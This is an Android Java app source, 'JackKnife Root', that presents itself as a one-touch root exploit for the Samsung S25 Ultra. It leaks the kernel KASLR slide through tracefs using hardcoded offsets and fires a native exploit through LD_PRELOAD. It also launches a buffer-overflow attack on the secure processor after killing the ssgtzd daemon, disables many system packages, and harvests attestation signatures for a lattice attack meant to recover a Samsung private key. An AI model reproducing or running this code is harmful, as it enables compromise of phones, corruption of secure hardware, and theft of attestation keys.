package com.jackknife.root;

import android.app.Activity;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.widget.Button;
import android.widget.ScrollView;
import android.widget.TextView;
import android.graphics.Color;
import android.graphics.Typeface;
import android.view.Gravity;
import android.widget.LinearLayout;
import android.security.keystore.KeyGenParameterSpec;
import android.security.keystore.KeyProperties;
import java.io.*;
import java.security.KeyPairGenerator;
import java.security.KeyStore;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

/**
 * JackKnife Root — One-Touch Samsung S25 Ultra Root
 * CVE-2026-43499 (GhostLock v6) with Samsung KASLR bypass
 *
 * JackKnife Studios, July 2026
 */
public class MainActivity extends Activity {

    private TextView logView;
    private ScrollView scrollView;
    private Button rootButton;
    private Button statusButton;
    private final Handler handler = new Handler(Looper.getMainLooper());
    private final ExecutorService executor = Executors.newSingleThreadExecutor();

    private static final String EXPLOIT_NAME = "cve-2026-43499";
    private static final String ROOT_HELPER = "cve-2026-43499-root";
    private static final long KIMAGE_TEXT_BASE = 0xffffffc080000000L;
    private static final long WORKER_OFFSET = 0xD8550L; // worker_thread+0x9c
    private static final int TRACE_EVENT_ID = 109; // sched_blocked_reason

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setBackgroundColor(Color.BLACK);
        root.setPadding(32, 48, 32, 32);

        TextView title = new TextView(this);
        title.setText("JackKnife Root");
        title.setTextColor(Color.parseColor("#00FF41"));
        title.setTextSize(28);
        title.setTypeface(Typeface.MONOSPACE, Typeface.BOLD);
        title.setGravity(Gravity.CENTER);
        root.addView(title);

        TextView subtitle = new TextView(this);
        subtitle.setText("Samsung S25 Ultra | GhostLock v6\nCVE-2026-43499 | Knox-Safe");
        subtitle.setTextColor(Color.parseColor("#888888"));
        subtitle.setTextSize(14);
        subtitle.setTypeface(Typeface.MONOSPACE);
        subtitle.setGravity(Gravity.CENTER);
        subtitle.setPadding(0, 8, 0, 24);
        root.addView(subtitle);

        LinearLayout buttons = new LinearLayout(this);
        buttons.setOrientation(LinearLayout.HORIZONTAL);
        buttons.setGravity(Gravity.CENTER);

        rootButton = new Button(this);
        rootButton.setText("ROOT");
        rootButton.setTextColor(Color.BLACK);
        rootButton.setBackgroundColor(Color.parseColor("#00FF41"));
        rootButton.setTextSize(18);
        rootButton.setTypeface(Typeface.MONOSPACE, Typeface.BOLD);
        rootButton.setPadding(64, 24, 64, 24);
        rootButton.setOnClickListener(v -> startRoot());
        buttons.addView(rootButton);

        statusButton = new Button(this);
        statusButton.setText("STATUS");
        statusButton.setTextColor(Color.parseColor("#00FF41"));
        statusButton.setBackgroundColor(Color.parseColor("#333333"));
        statusButton.setTextSize(14);
        statusButton.setTypeface(Typeface.MONOSPACE);
        statusButton.setPadding(32, 24, 32, 24);
        statusButton.setOnClickListener(v -> checkStatus());
        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.WRAP_CONTENT,
            LinearLayout.LayoutParams.WRAP_CONTENT);
        lp.setMargins(24, 0, 0, 0);
        statusButton.setLayoutParams(lp);
        buttons.addView(statusButton);

        root.addView(buttons);

        // Second row: SPU + Surveillance buttons
        LinearLayout row2 = new LinearLayout(this);
        row2.setOrientation(LinearLayout.HORIZONTAL);
        row2.setGravity(Gravity.CENTER);
        row2.setPadding(0, 8, 0, 0);

        Button spuButton = new Button(this);
        spuButton.setText("LIBERATE SPU");
        spuButton.setTextColor(Color.BLACK);
        spuButton.setBackgroundColor(Color.parseColor("#FF4444"));
        spuButton.setTextSize(12);
        spuButton.setTypeface(Typeface.MONOSPACE, Typeface.BOLD);
        spuButton.setPadding(24, 16, 24, 16);
        spuButton.setOnClickListener(v -> startSpuAttack());
        row2.addView(spuButton);

        Button killButton = new Button(this);
        killButton.setText("KILL SPYWARE");
        killButton.setTextColor(Color.BLACK);
        killButton.setBackgroundColor(Color.parseColor("#FFAA00"));
        killButton.setTextSize(12);
        killButton.setTypeface(Typeface.MONOSPACE, Typeface.BOLD);
        killButton.setPadding(24, 16, 24, 16);
        LinearLayout.LayoutParams klp = new LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.WRAP_CONTENT,
            LinearLayout.LayoutParams.WRAP_CONTENT);
        klp.setMargins(16, 0, 0, 0);
        killButton.setLayoutParams(klp);
        killButton.setOnClickListener(v -> killSurveillance());
        row2.addView(killButton);

        root.addView(row2);

        // Third row: Signature collector
        LinearLayout row3 = new LinearLayout(this);
        row3.setOrientation(LinearLayout.HORIZONTAL);
        row3.setGravity(Gravity.CENTER);
        row3.setPadding(0, 8, 0, 0);

        Button sigButton = new Button(this);
        sigButton.setText("COLLECT SIGS");
        sigButton.setTextColor(Color.BLACK);
        sigButton.setBackgroundColor(Color.parseColor("#00AAFF"));
        sigButton.setTextSize(12);
        sigButton.setTypeface(Typeface.MONOSPACE, Typeface.BOLD);
        sigButton.setPadding(24, 16, 24, 16);
        sigButton.setOnClickListener(v -> collectSignatures());
        row3.addView(sigButton);

        root.addView(row3);

        scrollView = new ScrollView(this);
        scrollView.setPadding(0, 16, 0, 0);
        logView = new TextView(this);
        logView.setTextColor(Color.parseColor("#00FF41"));
        logView.setTextSize(11);
        logView.setTypeface(Typeface.MONOSPACE);
        logView.setPadding(8, 8, 8, 8);
        scrollView.addView(logView);

        LinearLayout.LayoutParams slp = new LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT, 0, 1.0f);
        slp.setMargins(0, 16, 0, 0);
        scrollView.setLayoutParams(slp);
        root.addView(scrollView);

        setContentView(root);
        log("[*] JackKnife Root initialized");
        log("[*] Extract exploit binaries...");
        executor.execute(this::extractBinaries);
    }

    private void log(String msg) {
        handler.post(() -> {
            logView.append(msg + "\n");
            scrollView.post(() -> scrollView.fullScroll(ScrollView.FOCUS_DOWN));
        });
    }

    private void extractBinaries() {
        try {
            String dir = getFilesDir().getAbsolutePath();
            extractAsset(EXPLOIT_NAME, dir + "/" + EXPLOIT_NAME);
            extractAsset(ROOT_HELPER, dir + "/" + ROOT_HELPER);
            exec("chmod 755 " + dir + "/" + EXPLOIT_NAME);
            exec("chmod 755 " + dir + "/" + ROOT_HELPER);
            log("[+] Binaries extracted to " + dir);
        } catch (Exception e) {
            log("[!] Extract failed: " + e.getMessage());
        }
    }

    private void extractAsset(String name, String outPath) throws IOException {
        InputStream in = getAssets().open(name);
        FileOutputStream out = new FileOutputStream(outPath);
        byte[] buf = new byte[8192];
        int n;
        while ((n = in.read(buf)) > 0) out.write(buf, 0, n);
        out.close();
        in.close();
    }

    private void startRoot() {
        rootButton.setEnabled(false);
        rootButton.setText("ROOTING...");
        rootButton.setBackgroundColor(Color.parseColor("#FF8800"));
        log("");
        log("========================================");
        log("  JACKKNIFE ROOT — GHOSTLOCK v6");
        log("  Samsung S25 Ultra KASLR Bypass");
        log("========================================");
        log("");

        executor.execute(() -> {
            try {
                // Phase 1: Collect KASLR slide from tracefs
                log("[*] Phase 1: Collecting KASLR slide from tracefs...");
                long slide = collectKaslrSlide();
                if (slide < 0) {
                    log("[!] KASLR collection failed. Retrying...");
                    slide = collectKaslrSlide();
                }
                if (slide < 0) {
                    log("[!] Cannot determine KASLR slide.");
                    log("[!] Try again — tracefs needs idle CPU time.");
                    resetButton();
                    return;
                }
                log(String.format("[+] KASLR slide: 0x%x (%.1f GB)", slide, slide / 1073741824.0));

                // Phase 2: Fire exploit
                log("[*] Phase 2: Firing GhostLock exploit...");
                String dir = getFilesDir().getAbsolutePath();
                String cmd = String.format(
                    "SLIDE_P0_OFFSET=0x%x LD_PRELOAD=%s/%s /system/bin/true",
                    slide, dir, EXPLOIT_NAME);
                String result = execRoot(cmd);
                log(result);

                // Phase 3: Verify
                log("[*] Phase 3: Verifying root...");
                String id = exec(dir + "/" + ROOT_HELPER + " -c id");
                log("[+] " + id.trim());

                if (id.contains("uid=0")) {
                    log("");
                    log("========================================");
                    log("  ROOT ACHIEVED!");
                    log("  " + id.trim());
                    log("  Knox warranty_bit: CLEAN");
                    log("========================================");
                    handler.post(() -> {
                        rootButton.setText("ROOTED!");
                        rootButton.setBackgroundColor(Color.parseColor("#00FF41"));
                    });
                } else {
                    log("[-] Root not detected. May need retry.");
                    resetButton();
                }
            } catch (Exception e) {
                log("[!] Error: " + e.getMessage());
                resetButton();
            }
        });
    }

    private long collectKaslrSlide() {
        try {
            // Enable sched_blocked_reason tracing
            writeFile("/sys/kernel/tracing/tracing_on", "0");
            writeFile("/sys/kernel/tracing/events/sched/sched_blocked_reason/enable", "1");
            writeFile("/sys/kernel/tracing/trace", "");
            writeFile("/sys/kernel/tracing/tracing_on", "1");

            log("[*] Collecting trace data (3 seconds)...");
            Thread.sleep(3000);

            writeFile("/sys/kernel/tracing/tracing_on", "0");
            writeFile("/sys/kernel/tracing/events/sched/sched_blocked_reason/enable", "0");

            // Read binary trace from each CPU
            int cpus = Runtime.getRuntime().availableProcessors();
            for (int cpu = 0; cpu < cpus; cpu++) {
                String path = String.format(
                    "/sys/kernel/tracing/per_cpu/cpu%d/trace_pipe_raw", cpu);
                long slide = parseTracePage(path);
                if (slide >= 0) return slide;
            }
        } catch (Exception e) {
            log("[!] Trace error: " + e.getMessage());
        }
        return -1;
    }

    private long parseTracePage(String path) {
        try {
            FileInputStream fis = new FileInputStream(path);
            byte[] page = new byte[4096];
            // Non-blocking: read what's available
            int total = 0;
            while (total < 4096) {
                int n = fis.read(page, total, 4096 - total);
                if (n <= 0) break;
                total += n;
            }
            fis.close();
            if (total < 20) return -1;

            // Parse ring buffer page
            long commit = readLong(page, 8);
            int dataLen = (int)(commit & 0xFFF);
            int end = Math.min(16 + dataLen, total);

            int pos = 16;
            while (pos + 4 <= end) {
                int header = readInt(page, pos);
                int typeLen = header & 0x1F;
                if (typeLen == 30) { pos += 8; continue; }
                if (typeLen == 31) { pos += 12; continue; }
                if (typeLen == 0 || typeLen >= 29) break;

                int recordLen = typeLen * 4;
                int record = pos + 4;
                if (record + recordLen > end) break;

                int eventId = readShort(page, record);
                if (eventId == TRACE_EVENT_ID && recordLen >= 24) {
                    long caller = readLong(page, record + 16);
                    long linkCaller = KIMAGE_TEXT_BASE + WORKER_OFFSET;
                    if (caller > linkCaller) {
                        long candidate = caller - linkCaller;
                        // Samsung: slide can be up to 256GB, must be 64KB-aligned
                        if (candidate <= 0x4000000000L && (candidate & 0xFFFFL) == 0) {
                            return candidate;
                        }
                    }
                }
                pos = record + recordLen;
            }
        } catch (Exception e) {
            // trace_pipe_raw may block or fail — that's OK
        }
        return -1;
    }

    private void checkStatus() {
        executor.execute(() -> {
            try {
                String dir = getFilesDir().getAbsolutePath();
                String id = exec(dir + "/" + ROOT_HELPER + " -c id");
                if (id.contains("uid=0")) {
                    log("[+] ROOT ACTIVE: " + id.trim());
                } else {
                    log("[-] Not rooted (root is volatile — lost on reboot)");
                }
            } catch (Exception e) {
                log("[-] Not rooted: " + e.getMessage());
            }
        });
    }

    // ================================================================
    // SPU LIBERATION — CVE-2026-25277 Buffer Overflow Attack
    // Step 1: Seed SPU heap via Android KeyStore API (Strongbox)
    // Step 2: Kill ssgtzd, register sp_keymaster, SEND overflow bomb
    // Step 3: The overflow reads our seeded data from the heap!
    // ================================================================
    private void startSpuAttack() {
        log("");
        log("========================================");
        log("  SPU LIBERATION — CVE-2026-25277");
        log("  Buffer Overflow + Heap Seed Attack");
        log("========================================");
        log("");

        executor.execute(() -> {
            try {
                String dir = getFilesDir().getAbsolutePath();
                String rootHelper = dir + "/" + ROOT_HELPER;

                // Phase 1: Seed SPU heap via Android KeyStore API
                log("[*] Phase 1: Seeding SPU heap via KeyStore API...");
                seedStrongboxHeap();

                // Phase 2: Extract and run the PROVEN overflow tool
                log("[*] Phase 2: Running SPU overflow (kill → register → SEND)...");
                extractAsset("spu_kill_and_bomb.so", dir + "/spu_attack.so");
                exec("chmod 755 " + dir + "/spu_attack.so");

                // Write ssgtzd PID for the tool
                String pidResult = exec(rootHelper + " -c 'pidof ssgtzd'");
                writeFile(dir + "/.ssgtzd_pid", pidResult.trim());
                log("[+] ssgtzd PID: " + pidResult.trim());

                // Fire the PROVEN overflow: kill ssgtzd → register → SEND(len=0x1000)
                String attackResult = exec(rootHelper + " -c '"
                    + "LD_PRELOAD=" + dir + "/spu_attack.so /system/bin/true 2>&1'");
                log(attackResult);

                // Phase 3: Read results
                log("[*] Phase 3: Reading SPU attack results...");
                String results = exec(rootHelper + " -c 'cat /data/local/tmp/killbomb.txt 2>/dev/null"
                    + " || cat /data/local/tmp/kill_recv.txt 2>/dev/null"
                    + " || echo NO_OUTPUT'");
                log(results);

                // Phase 4: Verify SPU state
                log("[*] Phase 4: Post-attack SPU check...");
                // Try KeyStore operation to see if SPU behavior changed
                try {
                    KeyStore ks = KeyStore.getInstance("AndroidKeyStore");
                    ks.load(null);
                    boolean hasKey = ks.containsAlias("jackknife_test");
                    log("[+] KeyStore accessible: " + !hasKey + " (no crash)");
                } catch (Exception e) {
                    log("[!] KeyStore error after attack: " + e.getMessage());
                    log("[!] *** SPU STATE MAY BE CORRUPTED! ***");
                }

                log("");
                log("[+] SPU attack complete. Check results above.");

            } catch (Exception e) {
                log("[!] SPU attack error: " + e.getMessage());
            }
        });
    }

    private void seedStrongboxHeap() {
        // Use Android KeyStore API to generate keys targeting Strongbox
        // This causes ssgtzd to send commands to the SPU,
        // allocating heap buffers with our controlled parameters
        try {
            log("[*] Generating Strongbox key (seeds SPU heap)...");

            // Try to generate an EC key in Strongbox
            KeyPairGenerator kpg = KeyPairGenerator.getInstance(
                KeyProperties.KEY_ALGORITHM_EC, "AndroidKeyStore");

            KeyGenParameterSpec.Builder specBuilder = new KeyGenParameterSpec.Builder(
                "jackknife_spu_seed_" + System.currentTimeMillis(),
                KeyProperties.PURPOSE_SIGN | KeyProperties.PURPOSE_VERIFY)
                .setDigests(KeyProperties.DIGEST_SHA256)
                .setAlgorithmParameterSpec(
                    new java.security.spec.ECGenParameterSpec("secp256r1"));

            // Try Strongbox first, fall back to TEE
            try {
                specBuilder.setIsStrongBoxBacked(true);
                log("[+] Requesting Strongbox-backed key...");
            } catch (Exception e) {
                log("[*] Strongbox flag not available, using TEE...");
            }

            // Set large attestation challenge to maximize heap allocation
            byte[] challenge = new byte[128];
            for (int i = 0; i < 128; i++) challenge[i] = (byte)(0x41 + (i % 26));
            specBuilder.setAttestationChallenge(challenge);

            kpg.initialize(specBuilder.build());

            // Generate! This triggers SPU communication via ssgtzd
            java.security.KeyPair kp = kpg.generateKeyPair();
            log("[+] Key generated! SPU heap now has our attestation data");

            // Generate a few more to fill the heap
            for (int i = 0; i < 5; i++) {
                String alias = "jackknife_seed_" + i + "_" + System.currentTimeMillis();
                KeyGenParameterSpec.Builder sb = new KeyGenParameterSpec.Builder(
                    alias, KeyProperties.PURPOSE_SIGN)
                    .setDigests(KeyProperties.DIGEST_SHA256)
                    .setAlgorithmParameterSpec(
                        new java.security.spec.ECGenParameterSpec("secp256r1"))
                    .setAttestationChallenge(challenge);
                try { sb.setIsStrongBoxBacked(true); } catch (Exception e) {}
                kpg.initialize(sb.build());
                kpg.generateKeyPair();
                log("[+] Seed key " + (i+1) + "/5 generated");
            }

        } catch (Exception e) {
            log("[!] KeyStore seed error: " + e.getMessage());
            log("[*] SPU heap may still have stale data from boot...");
        }
    }

    // ================================================================
    // SURVEILLANCE KILL — Permanently disable Samsung spyware
    // ================================================================
    private void killSurveillance() {
        log("");
        log("========================================");
        log("  GHOSTLOCK SURVEILLANCE KILL");
        log("========================================");
        log("");

        executor.execute(() -> {
            try {
                String dir = getFilesDir().getAbsolutePath();
                String rootHelper = dir + "/" + ROOT_HELPER;

                // Run the proven surveillance kill script
                // ALL 26 surveillance + carrier packages
                String[] spyware = {
                    // Knox analytics & telemetry
                    "com.samsung.android.knox.analytics.uploader",
                    "com.samsung.android.sdm.config",
                    "com.google.mainline.telemetry",
                    // Diagnostics & logging
                    "com.sec.android.diagmonagent",
                    "com.samsung.android.networkdiagnostic",
                    "com.android.devicediagnostics",
                    "com.sec.imslogger",
                    // Bixby AI surveillance
                    "com.samsung.android.bixby.agent",
                    "com.samsung.android.bixby.wakeup",
                    "com.samsung.android.bixbyvision.framework",
                    "com.samsung.android.visionintelligence",
                    "com.samsung.android.forest",
                    // Samsung cloud & push (data exfiltration)
                    "com.samsung.android.scloud",
                    "com.samsung.android.pushservice",
                    "com.samsung.android.knox.pushmanager",
                    "com.sec.spp.push",
                    // OTA & carrier update pipeline
                    "com.samsung.android.app.updatecenter",
                    "com.samsung.android.app.omcagent",
                    "com.wssyncmldm",
                    "com.sec.android.soagent",
                    "com.sec.omadmclient",
                    "com.android.carrierdefaultapp",
                    // SIM Toolkit (carrier code push)
                    "com.android.stk",
                    "com.android.stk2",
                    // Samsung VOC (Voice of Customer = keyword monitoring)
                    "com.samsung.android.voc",
                    // Samsung app analytics
                    "com.samsung.android.app.spage",
                };
                int killed = 0;
                for (String pkg : spyware) {
                    String r = exec(rootHelper + " -c 'pm disable-user --user 0 " + pkg + " 2>&1'");
                    if (r.contains("disabled")) {
                        killed++;
                        log("[+] KILLED: " + pkg);
                    }
                }
                log("");
                log("[+] " + killed + "/" + spyware.length + " surveillance packages KILLED!");
                log("[+] Changes PERSIST across reboots!");

                // Also set carrier props to block SIM push
                exec(rootHelper + " -c '"
                    + "setprop persist.vendor.ril.disable_bip 1;"
                    + "setprop persist.vendor.config.disable_stk 1;"
                    + "echo SIM_BLOCKED'");
                log("[+] SIM Toolkit & BIP: BLOCKED!");

            } catch (Exception e) {
                log("[!] Kill error: " + e.getMessage());
            }
        });
    }

    // ================================================================
    // ECDSA SIGNATURE COLLECTION — For LLL Lattice Reduction Attack
    // Each attestation generates a NEW Samsung-signed certificate!
    // Collect 100+ for nonce bias analysis → private key recovery
    // ================================================================
    private void collectSignatures() {
        log("");
        log("========================================");
        log("  ECDSA SIGNATURE COLLECTION");
        log("  Samsung Attestation Key Analysis");
        log("========================================");
        log("");

        executor.execute(() -> {
            try {
                KeyStore ks = KeyStore.getInstance("AndroidKeyStore");
                ks.load(null);

                int totalSigs = 0;
                StringBuilder sigData = new StringBuilder();
                sigData.append("# Samsung ECDSA Attestation Signatures\n");
                sigData.append("# SM-S938W Galaxy S25 Ultra\n");
                sigData.append("# Format: idx|level|issuer|algo|sig_hex|hash_hex\n\n");

                for (int i = 0; i < 100; i++) {
                    String alias = "jk_sig_" + i + "_" + System.currentTimeMillis();
                    try {
                        byte[] challenge = new byte[32];
                        for (int j = 0; j < 32; j++)
                            challenge[j] = (byte)((i * 7 + j * 13) & 0xFF);

                        KeyPairGenerator kpg = KeyPairGenerator.getInstance(
                            KeyProperties.KEY_ALGORITHM_EC, "AndroidKeyStore");

                        KeyGenParameterSpec.Builder spec = new KeyGenParameterSpec.Builder(
                            alias, KeyProperties.PURPOSE_SIGN | KeyProperties.PURPOSE_VERIFY)
                            .setDigests(KeyProperties.DIGEST_SHA256)
                            .setAlgorithmParameterSpec(
                                new java.security.spec.ECGenParameterSpec("secp256r1"))
                            .setAttestationChallenge(challenge);

                        try { spec.setIsStrongBoxBacked(true); }
                        catch (Exception e) { /* TEE fallback */ }

                        kpg.initialize(spec.build());
                        java.security.KeyPair kp = kpg.generateKeyPair();

                        java.security.cert.Certificate[] chain = ks.getCertificateChain(alias);
                        if (chain != null) {
                            for (int c = 0; c < chain.length; c++) {
                                java.security.cert.X509Certificate cert =
                                    (java.security.cert.X509Certificate) chain[c];
                                byte[] sig = cert.getSignature();
                                byte[] tbs = cert.getTBSCertificate();

                                java.security.MessageDigest md =
                                    java.security.MessageDigest.getInstance("SHA-256");
                                byte[] tbsHash = md.digest(tbs);

                                String sigHex = bytesToHex(sig);
                                String hashHex = bytesToHex(tbsHash);
                                String issuer = cert.getIssuerDN().getName();
                                String algo = cert.getSigAlgName();

                                sigData.append(i + "|" + c + "|" + issuer + "|"
                                    + algo + "|" + sigHex + "|" + hashHex + "\n");
                                totalSigs++;
                            }
                        }
                        ks.deleteEntry(alias);

                        if (i % 10 == 9) {
                            log("[+] " + (i+1) + "/100 keys generated, " + totalSigs + " sigs");
                        }
                    } catch (Exception e) {
                        if (i < 3) log("[!] Key " + i + ": " + e.getMessage());
                        try { ks.deleteEntry(alias); } catch (Exception e2) {}
                    }
                }

                // Save to file
                String dir = getFilesDir().getAbsolutePath();
                String outPath = dir + "/attestation_sigs.txt";
                FileWriter fw = new FileWriter(outPath);
                fw.write(sigData.toString());
                fw.close();

                // Also save to accessible location via root
                String rootHelper = dir + "/" + ROOT_HELPER;
                exec(rootHelper + " -c 'cp " + outPath
                    + " /data/local/tmp/attestation_sigs.txt'");

                log("");
                log("[+] COLLECTED: " + totalSigs + " ECDSA signatures!");
                log("[+] Saved to: " + outPath);
                log("[+] Pull with: adb pull /data/local/tmp/attestation_sigs.txt");
                log("");
                log("[*] Run LLL analysis on iMac to check for nonce bias");

            } catch (Exception e) {
                log("[!] Collection error: " + e.getMessage());
            }
        });
    }

    private static String bytesToHex(byte[] bytes) {
        StringBuilder sb = new StringBuilder();
        for (byte b : bytes) sb.append(String.format("%02x", b & 0xFF));
        return sb.toString();
    }

    private void resetButton() {
        handler.post(() -> {
            rootButton.setEnabled(true);
            rootButton.setText("ROOT");
            rootButton.setBackgroundColor(Color.parseColor("#00FF41"));
        });
    }

    private void writeFile(String path, String value) {
        try {
            FileWriter fw = new FileWriter(path);
            fw.write(value);
            fw.close();
        } catch (Exception e) {
            // Tracefs write may fail on some configs
        }
    }

    private String exec(String cmd) {
        try {
            Process p = Runtime.getRuntime().exec(new String[]{"/system/bin/sh", "-c", cmd});
            BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = br.readLine()) != null) sb.append(line).append("\n");
            BufferedReader er = new BufferedReader(new InputStreamReader(p.getErrorStream()));
            while ((line = er.readLine()) != null) sb.append(line).append("\n");
            p.waitFor();
            return sb.toString();
        } catch (Exception e) {
            return "exec error: " + e.getMessage();
        }
    }

    private String execRoot(String cmd) {
        return exec(cmd);
    }

    private static int readShort(byte[] buf, int off) {
        return (buf[off] & 0xFF) | ((buf[off+1] & 0xFF) << 8);
    }

    private static int readInt(byte[] buf, int off) {
        return (buf[off] & 0xFF) | ((buf[off+1] & 0xFF) << 8) |
               ((buf[off+2] & 0xFF) << 16) | ((buf[off+3] & 0xFF) << 24);
    }

    private static long readLong(byte[] buf, int off) {
        long lo = readInt(buf, off) & 0xFFFFFFFFL;
        long hi = readInt(buf, off + 4) & 0xFFFFFFFFL;
        return lo | (hi << 32);
    }
}
